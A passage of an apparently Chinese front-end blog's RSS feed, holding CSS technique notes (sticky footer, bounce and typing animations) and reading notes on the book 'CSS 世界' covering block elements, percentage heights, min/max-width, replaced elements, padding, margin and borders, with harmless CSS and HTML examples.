<span>box-shadow</span><span>:</span> 0 0 0 1px <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.3<span>)</span> inset<span>;</span>
<span>background-clip</span><span>:</span> padding-box<span>;</span>

<span>/* 方案三 */</span>
<span>button</span> <span>{</span>
  <span>position</span><span>:</span> relative<span>;</span>
  <span>/* [其余样式] */</span>
<span>}</span>
<span>button::before</span> <span>{</span>
  <span>content</span><span>:</span> <span>''</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> -10px<span>;</span>
  <span>right</span><span>:</span> -10px<span>;</span>
  <span>bottom</span><span>:</span> -10px<span>;</span>
  <span>left</span><span>:</span> -10px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br></div></div><h2 id="_31-紧贴底部的页脚-demo"> 31. 紧贴底部的页脚（<a href="http://play.csssecrets.io/sticky-footer" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span>body</span> <span>{</span>
  <span>display</span><span>:</span> flex<span>;</span>
  <span>flex-flow</span><span>:</span> column<span>;</span>
  <span>min-height</span><span>:</span> 100vh<span>;</span>
<span>}</span>
<span>main</span> <span>{</span>
  <span>flex</span><span>:</span> 1<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_32-缓动效果"> 32. 缓动效果</h2>
<ul>
<li>弹跳动画（<a href="http://play.csssecrets.io/bounce" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span><span>@keyframes</span> bounce</span> <span>{</span>
  <span>60%,
  80%,
  to</span> <span>{</span>
    <span>transform</span><span>:</span> <span>translateY</span><span>(</span>400px<span>)</span><span>;</span>
    <span>animation-timing-function</span><span>:</span> ease<span>;</span>
  <span>}</span>
  <span>70%</span> <span>{</span>
    <span>transform</span><span>:</span> <span>translateY</span><span>(</span>300px<span>)</span><span>;</span>
  <span>}</span>
  <span>90%</span> <span>{</span>
    <span>transform</span><span>:</span> <span>translateY</span><span>(</span>360px<span>)</span><span>;</span>
  <span>}</span>
<span>}</span>

<span>.ball</span> <span>{</span>
  <span>width</span><span>:</span> 0<span>;</span>
  <span>height</span><span>:</span> 0<span>;</span>
  <span>padding</span><span>:</span> 1.5em<span>;</span>
  <span>border-radius</span><span>:</span> 50%<span>;</span>
  <span>margin</span><span>:</span> auto<span>;</span>
  <span>background</span><span>:</span> red <span>radial-gradient</span><span>(</span>at 30% 30%<span>,</span> #fdd<span>,</span> red<span>)</span><span>;</span>
  <span>animation</span><span>:</span> bounce 2s <span>cubic-bezier</span><span>(</span>0.1<span>,</span> 0.25<span>,</span> 1<span>,</span> 0.25<span>)</span> forwards<span>;</span>
<span>}</span>

<span>body</span> <span>{</span>
  <span>background</span><span>:</span> <span>linear-gradient</span><span>(</span>skyblue<span>,</span> white 450px<span>,</span> yellowgreen 0<span>)</span><span>;</span>
  <span>min-height</span><span>:</span> 100vh<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br></div></div><ul>
<li>弹性过渡（<a href="http://play.csssecrets.io/elastic" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>label</span><span>></span></span>
  Your username: <span><span><span>&lt;</span>input</span> <span>id</span><span><span>=</span><span>"</span>username<span>"</span></span> <span>/></span></span>
  <span><span><span>&lt;</span>span</span> <span>class</span><span><span>=</span><span>"</span>callout<span>"</span></span>
    <span>></span></span>Only letters, numbers, underscores (_) and hyphens (-) allowed!<span><span><span>&lt;/</span>span</span>
  <span>></span></span>
<span><span><span>&lt;/</span>label</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><div><pre><code><span>input:not(:focus) + .callout:not(:hover)</span> <span>{</span>
  <span>transform</span><span>:</span> <span>scale</span><span>(</span>0<span>)</span><span>;</span>
  <span>transition</span><span>:</span> 0.25s transform<span>;</span>
<span>}</span>

<span>.callout</span> <span>{</span>
  <span>transition</span><span>:</span> 0.5s <span>cubic-bezier</span><span>(</span>0.25<span>,</span> 0.1<span>,</span> 0.3<span>,</span> 1.5<span>)</span> transform<span>;</span>
  <span>transform-origin</span><span>:</span> 1.4em -0.4em<span>;</span>
<span>}</span>

<span>/* Styling */</span>
<span>body</span> <span>{</span>
  <span>padding</span><span>:</span> 1.5em<span>;</span>
  <span>font</span><span>:</span> 200%/1.6 Baskerville<span>;</span>
<span>}</span>

<span>input</span> <span>{</span>
  <span>display</span><span>:</span> block<span>;</span>
  <span>padding</span><span>:</span> 0 0.4em<span>;</span>
  <span>font</span><span>:</span> inherit<span>;</span>
<span>}</span>

<span>.callout</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>max-width</span><span>:</span> 14em<span>;</span>
  <span>padding</span><span>:</span> 0.6em 0.8em<span>;</span>
  <span>border-radius</span><span>:</span> 0.3em<span>;</span>
  <span>margin</span><span>:</span> 0.3em 0 0 -0.2em<span>;</span>
  <span>background</span><span>:</span> #fed<span>;</span>
  <span>border</span><span>:</span> 1px solid <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.3<span>)</span><span>;</span>
  <span>box-shadow</span><span>:</span> 0.05em 0.2em 0.6em <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.2<span>)</span><span>;</span>
  <span>font-size</span><span>:</span> 75%<span>;</span>
<span>}</span>

<span>.callout:before</span> <span>{</span>
  <span>content</span><span>:</span> <span>''</span><span>;</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>top</span><span>:</span> -0.4em<span>;</span>
  <span>left</span><span>:</span> 1em<span>;</span>
  <span>padding</span><span>:</span> 0.35em<span>;</span>
  <span>background</span><span>:</span> inherit<span>;</span>
  <span>border</span><span>:</span> inherit<span>;</span>
  <span>border-right</span><span>:</span> 0<span>;</span>
  <span>border-bottom</span><span>:</span> 0<span>;</span>
  <span>transform</span><span>:</span> <span>rotate</span><span>(</span>45deg<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br><span>24</span><br><span>25</span><br><span>26</span><br><span>27</span><br><span>28</span><br><span>29</span><br><span>30</span><br><span>31</span><br><span>32</span><br><span>33</span><br><span>34</span><br><span>35</span><br><span>36</span><br><span>37</span><br><span>38</span><br><span>39</span><br><span>40</span><br><span>41</span><br><span>42</span><br><span>43</span><br><span>44</span><br><span>45</span><br><span>46</span><br></div></div><h2 id="_33-闪烁效果-demo"> 33. 闪烁效果（<a href="http://play.csssecrets.io/blink" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span><span>@keyframes</span> blink</span> <span>{</span>
  <span>50%</span> <span>{</span>
    <span>color</span><span>:</span> transparent<span>;</span>
  <span>}</span>
<span>}</span>
<span>.box</span> <span>{</span>
  <span>/* animation: 1s blink 3; */</span>
  <span>animation</span><span>:</span> 1s blink 3 <span>steps</span><span>(</span>1<span>)</span><span>;</span> <span>/* 或用step-end */</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br></div></div><h2 id="_34-打字动画-demo"> 34. 打字动画（<a href="http://play.csssecrets.io/typing" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span><span><span>&lt;</span>h1</span><span>></span></span>请给我一个面子，做我儿子吧！<span><span><span>&lt;/</span>h1</span><span>></span></span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span><span>@keyframes</span> typing</span> <span>{</span>
  <span>from</span> <span>{</span>
    <span>width</span><span>:</span> 0<span>;</span>
  <span>}</span>
<span>}</span>
<span><span>@keyframes</span> caret</span> <span>{</span>
  <span>50%</span> <span>{</span>
    <span>border-color</span><span>:</span> transparent<span>;</span>
  <span>}</span>
<span>}</span>
<span>h1</span> <span>{</span>
  <span>width</span><span>:</span> 14em<span>;</span> <span>/* 文本的宽度 */</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
  <span>white-space</span><span>:</span> nowrap<span>;</span>
  <span>border-right</span><span>:</span> 0.05em solid<span>;</span>
  <span>animation</span><span>:</span> typing 3s <span>steps</span><span>(</span>14<span>)</span><span>,</span> caret 1s <span>steps</span><span>(</span>1<span>)</span> infinite<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br></div></div>]]></content:encoded>
    </item>
    <item>
      <title>CSS 世界</title>
      <link>https://www.matrixtheone.ga/web/note/books/CSS-World/</link>
      <guid>https://www.matrixtheone.ga/web/note/books/CSS-World/</guid>
      <source url="https://www.matrixtheone.ga/web/rss.xml">CSS 世界</source>
      <pubDate>Mon, 08 May 2023 14:48:34 GMT</pubDate>
      <content:encoded><![CDATA[<h2 id="_1-了解-css-世界中的-未定义行为"> 1. 了解 CSS 世界中的 “未定义行为”</h2>
<ul>
<li>像<code>&lt;a&gt;</code>、<code>&lt;button&gt;</code>这样的元素，当我们使用键盘进行 Tab 键切换的时候，是可以被 focus 的，表现为虚框或者外发光，这类元素称为 “焦点元素”。非焦点元素指没有设置 tabindex 属性的<code>&lt;div&gt;</code>、<code>&lt;span&gt;</code>等普通元素。</li>
</ul>
<h2 id="_2-块级元素"> 2. 块级元素</h2>
<ul>
<li>“块级元素” 对应的英文是 block-level element，常见的块级元素有<code>&lt;div&gt;</code>、<code>&lt;li&gt;</code>和<code>&lt;table&gt;</code>等。需要注意是，“块级元素” 和 “display 为 block 的元素” 不是一个概念。例如，<code>&lt;li&gt;</code>元素默认的 display 值是 list-item，<code>&lt;table&gt;</code>元素默认的 display 值是 table，但是它们均是 “块级元素”，因为它们都符合块级元素的基本特征，也就是一个水平流上只能单独显示一个元素，多个块级元素则换行显示。</li>
</ul>
<h2 id="_3-文字少的时候居中显示-文字超过一行的时候居左显示-demo"> 3. 文字少的时候居中显示，文字超过一行的时候居左显示（<a href="https://demo.cssworld.cn/3/2-5.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<ul>
<li>如果想让英文字符和中文一样，每一个字符都用最小宽度单元，可以试试使用 CSS 中的 word-break: break-all。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>div</span> <span>class</span><span><span>=</span><span>"</span>box<span>"</span></span><span>></span></span>
  <span><span><span>&lt;</span>p</span> <span>id</span><span><span>=</span><span>"</span>conMore<span>"</span></span> <span>class</span><span><span>=</span><span>"</span>content<span>"</span></span><span>></span></span>请给我一个面子,做我儿子吧！<span><span><span>&lt;/</span>p</span><span>></span></span>
<span><span><span>&lt;/</span>div</span><span>></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><div><pre><code><span>.box</span> <span>{</span>
  <span>width</span><span>:</span> 240px<span>;</span>
  <span>padding</span><span>:</span> 10px<span>;</span>
  <span>background-color</span><span>:</span> #cd0000<span>;</span>
  <span>text-align</span><span>:</span> center<span>;</span>
<span>}</span>
<span>.content</span> <span>{</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
  <span>text-align</span><span>:</span> left<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="_4-首选最小宽度-与凹凸效果-demo"> 4. “首选最小宽度” 与凹凸效果（<a href="https://demo.cssworld.cn/3/2-6.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span>&lt;</span>span <span>class</span><span>=</span><span>"ao"</span><span>></span><span>&lt;</span><span>/</span>span<span>></span>
<span>&lt;</span>span <span>class</span><span>=</span><span>"tu"</span><span>></span><span>&lt;</span><span>/</span>span<span>></span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><div><pre><code><span>.ao,
.tu</span> <span>{</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
  <span>width</span><span>:</span> 0<span>;</span>
  <span>font-size</span><span>:</span> 14px<span>;</span>
  <span>line-height</span><span>:</span> 18px<span>;</span>
  <span>margin</span><span>:</span> 35px<span>;</span>
  <span>color</span><span>:</span> #fff<span>;</span>
<span>}</span>
<span>.ao:before,
.tu:before</span> <span>{</span>
  <span>outline</span><span>:</span> 2px solid #cd0000<span>;</span>
  <span>font-family</span><span>:</span> Consolas<span>,</span> Monaco<span>,</span> monospace<span>;</span>
<span>}</span>
<span>.ao:before</span> <span>{</span>
  <span>content</span><span>:</span> <span>'love你love'</span><span>;</span>
<span>}</span>
<span>.tu</span> <span>{</span>
  <span>direction</span><span>:</span> rtl<span>;</span>
<span>}</span>
<span>.tu:before</span> <span>{</span>
  <span>content</span><span>:</span> <span>'我love你'</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br><span>17</span><br><span>18</span><br><span>19</span><br><span>20</span><br><span>21</span><br><span>22</span><br><span>23</span><br></div></div><h2 id="_5-关于-height-100-无效"> 5. 关于 height: 100% 无效</h2>
<ul>
<li>
<p>有一种看似合理的说法：如果父元素 height:auto 子元素还支持 height:100%，则父元素的高度很容易陷入死循环，高度无限。实际上，这种解释是错误的，大家千万别被误导。证据就是宽度也存在类似场景，但并没有死循环。</p>
</li>
<li>
<p>首先，先下载文档内容，加载头部的样式资源（如果有的话），然后按照从上而下、自外而内的顺序渲染 DOM 内容。套用本例就是，先渲染父元素，后渲染子元素，是有先后顺序的。因此，当渲染到父元素的时候，子元素的 width:100%并没有渲染，宽度就是图片加文字内容的宽度。等渲染到文字这个子元素的时候，父元素宽度已经固定，此时的 width:100%就是已经固定好的父元素的宽度。宽度不够怎么办？溢出就好了，overflow 属性就是为此而生的。</p>
</li>
<li>
<p>为何宽度支持，高度就不支持呢？规范中其实给出了答案。如果包含块的高度没有显式指定（即高度由内容决定），并且该元素不是绝对定位，则计算值为 auto。一句话总结就是：因为解释成了 auto。要知道，auto 和百分比计算，肯定是算不了的：（'auto' * 100/100 = NaN）。但是，宽度的解释却是：如果包含块的宽度取决于该元素的宽度，那么产生的布局在 CSS 2.1 中是未定义的。</p>
</li>
<li>
<p>还记不记得本书第 2 章最后的 “未定义行为” 吗？这里的宽度布局其实也是 “未定义行为”，也就是规范没有明确表示该怎样，浏览器可以自己根据理解去发挥。好在根据我的测试，布局效果在各个浏览器下都是一致的。这里和高度的规范定义就区别明显了，高度明确了就是 auto，高度百分比计算自然无果，width 却没有这样的说法，因此，就按照包含块真实的计算值作为百分比计算的基数。</p>
</li>
</ul>
<h2 id="_6-如何让元素支持-height-100-效果-demo"> 6. 如何让元素支持 height:100%效果（<a href="https://demo.cssworld.cn/3/2-11.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<ul>
<li>
<ol>
<li>设定显式的高度值。</li>
</ol>
</li>
<li>
<ol start="2">
<li>使用绝对定位。</li>
</ol>
<blockquote>
<p>绝对定位元素的百分比计算和非绝对定位元素的百分比计算是有区别的，区别在于绝对定位的宽高百分比计算是相对于 padding box 的，也就是说会把 padding 大小值计算在内，但是，非绝对定位元素则是相对于 content box 计算的。</p>
</blockquote>
</li>
</ul>
<h2 id="_7-与众不同的初始值"> 7. 与众不同的初始值</h2>
<ul>
<li>min-width/min-height 的初始值是 auto，max-width/max-height 的初始值是 none。max-width/max-height 的初始值为何是 none 而不是 auto 呢？这个问题的答案其实与下面小节的内容有关。我们不妨举个简单的例子解释一下，已知父元素宽度 400 像素，子元素设置宽度 800 像素，假如说 max-width 初始值是 auto，那自然使用和 width 一样的解析渲染规则，此时 max-width 的计算值就应该是父元素的 400 像素，此时，你就会发现，子元素的 800 像素直接完蛋了，因为 max-width 会覆盖 width。于是，我们的 width 永远不能设置为比 auto 计算值更大的宽度值了，这显然是有问题的，这就是为什么 max-width 初始值是 none 的原因。</li>
</ul>
<h2 id="_8-超越-important-超越最大"> 8. 超越!important，超越最大</h2>
<ul>
<li>
<p>超越<code>!important</code>：指的是 max-width 会覆盖 width。</p>
</li>
<li>
<p>超越最大：指的是 min-width 覆盖 max-width。</p>
<blockquote>
<p>最后宽度为 256px。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>"</span>1.jpg<span>"</span></span> <span><span>style</span><span><span>=</span><span>"</span><span><span>width</span><span>:</span>480px<span>!important</span><span>;</span></span><span>"</span></span></span> <span>/></span></span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>img</span> <span>{</span>
  <span>max-width</span><span>:</span> 256px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><blockquote>
<p>.container 元素表现为至少 1400px 宽。</p>
</blockquote>
<div><pre><code><span>.container</span> <span>{</span>
  <span>min-width</span><span>:</span> 1400px<span>;</span>
  <span>max-width</span><span>:</span> 1200px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><h2 id="_9-替换元素的尺寸计算规则"> 9. 替换元素的尺寸计算规则</h2>
<ul>
<li>
<p>固有尺寸 &gt; HTML 尺寸 &gt; CSS 尺寸。</p>
<blockquote>
<p>固有尺寸：图片原尺寸。</p>
</blockquote>
</li>
</ul>
<div><pre><code><span>&lt;!-- HTML 尺寸 --></span>
<span><span><span>&lt;</span>img</span> <span>src</span><span><span>=</span><span>"</span>1.jpg<span>"</span></span> <span>width</span><span><span>=</span><span>"</span>128<span>"</span></span> <span>height</span><span><span>=</span><span>"</span>96<span>"</span></span> <span>/></span></span>
</code></pre>
<div><span>1</span><br><span>2</span><br></div></div><div><pre><code><span>/* CSS 尺寸 */</span>
<span>img</span> <span>{</span>
  <span>width</span><span>:</span> 200px<span>;</span>
  <span>height</span><span>:</span> 150px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><ul>
<li>因为图片中的 content 替换内容默认的适配方式是填充（fill），也就是外部设定的尺寸多大，我就填满、跟着一样大。换句话说，尺寸变化的本质并不是改变固有尺寸，而是采用了填充作为适配 HTML 尺寸和 CSS 尺寸的方式。在 CSS3 新世界中，<code>&lt;img&gt;</code>和其他一些替换元素的替换内容的适配方式可以通过 object-fit 属性修改了。</li>
</ul>
<div><pre><code><span>/* 最终尺寸为1.jpg图片原尺寸 */</span>
<span>div:before</span> <span>{</span>
  <span>content</span><span>:</span> <span><span>url</span><span>(</span>1jpg<span>)</span></span><span>;</span>
  <span>display</span><span>:</span> block<span>;</span>
  <span>width</span><span>:</span> 200px<span>;</span>
  <span>height</span><span>:</span> 200px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br></div></div><h2 id="_10-替换元素和非替换元素的距离有多远"> 10. 替换元素和非替换元素的距离有多远</h2>
<ul>
<li>
<p>观点 1：替换元素和非替换元素之间只隔了一个 src 属性。</p>
<blockquote>
<ul>
<li>当我们点击按钮给图片添加一个 src 地址时，图片从普通元素变成替换元素，原本都还支持的::before 和::after 此时全部无效，此时再 hover 图片，是不会有任何信息出现的，于是就非常巧妙地增强了图片还没加载时的信息展示体验。</li>
<li>基于伪元素的图片内容生成技术（<a href="https://demo.cssworld.cn/4/1-2.php" target="_blank" rel="noopener noreferrer">demo</a>）。核心 CSS 代码：</li>
</ul>
</blockquote>
</li>
</ul>
<div><pre><code><span>img::after</span> <span>{</span>
  <span>/* 生成 alt 信息 */</span>
  <span>content</span><span>:</span> <span>attr</span><span>(</span>alt<span>)</span><span>;</span>
  <span>/* 尺寸和定位 */</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>bottom</span><span>:</span> 0<span>;</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>background-color</span><span>:</span> <span>rgba</span><span>(</span>0<span>,</span> 0<span>,</span> 0<span>,</span> 0.5<span>)</span><span>;</span>
  <span>transform</span><span>:</span> <span>translateY</span><span>(</span>100%<span>)</span><span>;</span>
  <span>/* 来点过渡动画效果 */</span>
  <span>transition</span><span>:</span> transform 0.2s<span>;</span>
<span>}</span>
<span>img:hover::after</span> <span>{</span>
  <span>/* alt 信息显示 */</span>
  <span>transform</span><span>:</span> <span>translateY</span><span>(</span>0<span>)</span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br><span>15</span><br><span>16</span><br></div></div><ul>
<li>观点 2：替换元素和非替换元素之间只隔了一个 CSS content 属性（<a href="https://demo.cssworld.cn/4/1-3.php" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span><span><span>&lt;</span>img</span> <span>/></span></span>
</code></pre>
<div><span>1</span><br></div></div><div><pre><code><span>img</span> <span>{</span>
  <span>content</span><span>:</span> <span><span>url</span><span>(</span>1jpg<span>)</span></span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_11-logo-创新的方法-demo"> 11. logo 创新的方法（<a href="https://demo.cssworld.cn/4/1-5.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<ul>
<li>缺陷：无法设置图片的尺寸。要想在移动端使用该技术，建议使用 SVG 矢量图片。</li>
</ul>
<div><pre><code><span>h1</span> <span>{</span>
  <span>content</span><span>:</span> <span><span>url</span><span>(</span>logo.png<span>)</span></span><span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br></div></div><h2 id="_12-padding-的百分比值"> 12. padding 的百分比值</h2>
<ul>
<li>宽高比为 5:1 的比例固定的头图（<a href="https://demo.cssworld.cn/4/2-3.php" target="_blank" rel="noopener noreferrer">demo</a>）。</li>
</ul>
<div><pre><code><span>.box</span> <span>{</span>
  <span>padding</span><span>:</span> 10% 50%<span>;</span>
  <span>position</span><span>:</span> relative<span>;</span>
<span>}</span>
<span>.box > img</span> <span>{</span>
  <span>position</span><span>:</span> absolute<span>;</span>
  <span>width</span><span>:</span> 100%<span>;</span>
  <span>height</span><span>:</span> 100%<span>;</span>
  <span>left</span><span>:</span> 0<span>;</span>
  <span>top</span><span>:</span> 0<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br></div></div><ul>
<li>内联元素的垂直 padding 会让 “幽灵空白节点” 显现，也就是规范中的 “strut” 出现。内联元素默认的高度完全受 font-size 大小控制。</li>
</ul>
<div><pre><code><span>span</span> <span>{</span>
  <span>padding</span><span>:</span> 50%<span>;</span>
  <span>font-size</span><span>:</span> 0<span>;</span>
  <span>background-color</span><span>:</span> gray<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br></div></div><h2 id="_13-padding-与图形绘制-demo"> 13. padding 与图形绘制（<a href="https://demo.cssworld.cn/4/2-4.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<ul>
<li>三道杠。</li>
</ul>
<div><pre><code><span>.icon-menu</span> <span>{</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
  <span>width</span><span>:</span> 140px<span>;</span>
  <span>height</span><span>:</span> 10px<span>;</span>
  <span>padding</span><span>:</span> 35px 0<span>;</span>
  <span>border-top</span><span>:</span> 10px solid<span>;</span>
  <span>border-bottom</span><span>:</span> 10px solid<span>;</span>
  <span>background-color</span><span>:</span> currentColor<span>;</span>
  <span>background-clip</span><span>:</span> content-box<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><ul>
<li>双层圆。</li>
</ul>
<div><pre><code><span>.icon-dot</span> <span>{</span>
  <span>display</span><span>:</span> inline-block<span>;</span>
  <span>width</span><span>:</span> 100px<span>;</span>
  <span>height</span><span>:</span> 100px<span>;</span>
  <span>padding</span><span>:</span> 10px<span>;</span>
  <span>border</span><span>:</span> 10px solid<span>;</span>
  <span>border-radius</span><span>:</span> 50%<span>;</span>
  <span>background-color</span><span>:</span> currentColor<span>;</span>
  <span>background-clip</span><span>:</span> content-box<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br></div></div><h2 id="_14-margin-负值与等高布局-demo"> 14. margin 负值与等高布局（<a href="https://demo.cssworld.cn/4/3-2.php" target="_blank" rel="noopener noreferrer">demo</a>）</h2>
<div><pre><code><span>.column-box</span> <span>{</span>
  <span>overflow</span><span>:</span> hidden<span>;</span>
<span>}</span>
<span>.column-left,
.column-right</span> <span>{</span>
  <span>margin-bottom</span><span>:</span> -9999px<span>;</span>
  <span>padding-bottom</span><span>:</span> 9999px<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br></div></div><h2 id="_15-margin-合并的计算规则"> 15. margin 合并的计算规则</h2>
<ul>
<li>“正正取大值”、“正负值相加”、“负负最负值”。</li>
</ul>
<h2 id="_16-了解各种-border-style-类型"> 16. 了解各种 border-style 类型</h2>
<ul>
<li>如果你是一个 “性能控”，可以两个一起写（0 和 none），根据前辈的测试，这样写渲染性能最高。</li>
</ul>
<div><pre><code><span>div</span> <span>{</span>
  <span>border</span><span>:</span> 1px solid<span>;</span>
  <span>border-bottom</span><span>:</span> 0 none<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br></div></div><ul>
<li>
<p>为什么 border-width 的默认值是 media（3px）。</p>
<blockquote>
<p>当边框宽度是 1px 和 2px 的时候，其表现和 border-style:solid 是一模一样的：当边框为 3px 的时候，才开始有双线边框的表现。</p>
</blockquote>
</li>
<li>
<p>三道杠。</p>
</li>
</ul>
<div><pre><code><span>.icon-menu</span> <span>{</span>
  <span>width</span><span>:</span> 120px<span>;</span>
  <span>height</span><span>:</span> 20px<span>;</span>
  <span>border-top</span><span>:</span> 60px double<span>;</span>
  <span>border-bottom</span><span>:</span> 20px solid<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br></div></div><h2 id="_17-border-color-和-color"> 17. border-color 和 color</h2>
<ul>
<li>
<p>border-color 有一个很重要也很实用的特性，就是 “border-color 默认颜色就是 color 色值”。</p>
<blockquote>
<p>可以看到，使用 border 实现，我们 hover 变色的时候，只需要重置 1 处，也就是重置元素本身的 color 就可以了。因为整个图形都是使用 border 绘制的，同时颜色缺省，所以所有图形颜色自动跟着一起变了（<a href="https://demo.cssworld.cn/4/4-1.php" target="_blank" rel="noopener noreferrer">demo</a>）。</p>
</blockquote>
<div><pre><code><span>.add</span> <span>{</span>
  <span>color</span><span>:</span> #ccc<span>;</span>
  <span>border</span><span>:</span> 2px dashed<span>;</span>
<span>}</span>
<span>.add:before</span> <span>{</span>
  <span>border-top</span><span>:</span> 10px solid<span>;</span>
<span>}</span>
<span>.add:after</span> <span>{</span>
  <span>border-left</span><span>:</span> 10px solid<span>;</span>
<span>}</span>
<span>/* hover 变色 */</span>
<span>.add:hover</span> <span>{</span>
  <span>color</span><span>:</span> #06c<span>;</span>
<span>}</span>
</code></pre>
<div><span>1</span><br><span>2</span><br><span>3</span><br><span>4</span><br><span>5</span><br><span>6</span><br><span>7</span><br><span>8</span><br><span>9</span><br><span>10</span><br><span>11</span><br><span>12</span><br><span>13</span><br><span>14</span><br></div></div></li>
</ul>
